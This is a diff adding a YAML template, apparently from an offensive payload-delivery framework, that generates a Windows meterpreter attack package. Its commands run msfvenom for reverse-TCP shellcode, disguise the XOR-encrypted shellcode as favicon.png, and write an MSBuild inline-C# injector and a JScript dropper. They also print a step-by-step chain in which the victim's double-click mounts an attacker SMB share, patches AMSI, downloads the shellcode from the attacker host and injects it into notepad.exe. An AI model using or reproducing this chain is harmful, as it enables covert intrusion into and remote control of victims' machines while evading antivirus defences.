@@ -1,0 +1,40 @@
+---
+metadata:
+  filename: "deliver-windows-x64-metasploit-meterpreter-tcp-shellcode-runner-jscript-msbuild-apc.yaml"
+  tags: ["shell", "windows", "evasion"]
+  created: "2026-06-04"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  printf '%s\n' 'msfvenom creates the shellcode. Please wait...'; \
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} EXITFUNC=thread -f raw > packstation/outbound/shellcode.bin ; \
+  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
+  rm packstation/outbound/shellcode.bin ; \
+  python -c "import base64; open('packstation/outbound/config.xml','w').write(base64.b64decode('{{ include('payloads/msbuild-xml-apc.yaml') | base64 }}').decode())" ; \
+  python -c "import base64; open('packstation/outbound/delivery.js','w').write(base64.b64decode('{{ include('payloads/msbuild-jscript-smb.yaml') | base64 }}').decode())" ; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------Listener------                      '; \
+  printf '%s\n' 'Start listener: {{ include('scripts/listener-metasploit-windows-x64-meterpreter-staged-tcp.yaml') }}'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  ---Step-by-Step Delivery---                  '; \
+  printf '%s\n' 'Step 1 - Ensure the target system has MSBuild.exe installed'; \
+  printf '%s\n' '  Required: .NET Framework 4.0 at C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ '; \
+  printf '%s\n' 'Step 2 - Start the meterpreter listener (see above)'; \
+  printf '%s\n' 'Step 3 - Start impacket SMB server in a separate terminal:'; \
+  printf '%s\n' '  impacket-smbserver share packstation/outbound -smb2support'; \
+  printf '%s\n' 'Step 4 - Deliver delivery.js to the target (e.g., email, USB, webdav)'; \
+  printf '%s\n' 'Step 5 - Attack chain on victim double-click:'; \
+  printf '%s\n' '  delivery.js -> WScript.Shell -> net use \\\\{{ attacker_ip }}\\share (mount SMB)'; \
+  printf '%s\n' '  -> MSBuild.exe \\\\{{ attacker_ip }}\\share\\config.xml (execute from share)'; \
+  printf '%s\n' '  -> MSBuild compiles and executes inline C#'; \
+  printf '%s\n' '  -> C# patches AMSI, downloads XOR(0xCA) shellcode from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png'; \
+  printf '%s\n' '  -> injects shellcode into notepad.exe via Early Bird APC'; \
+  printf '%s\n' '  -> meterpreter callback on {{ attacker_ip }}:{{ shell_port }}'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  ---Files in packstation---                   '; \
+  printf '%s\n' '  config.xml    -> MSBuild project with inline C# APC runner (served via SMB)'; \
+  printf '%s\n' '  favicon.png   -> XOR(0xCA) meterpreter shellcode (served via HTTP)'; \
+  printf '%s\n' '  delivery.js   -> JScript dropper, deliver to target'; \
+  printf '%s\n' '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
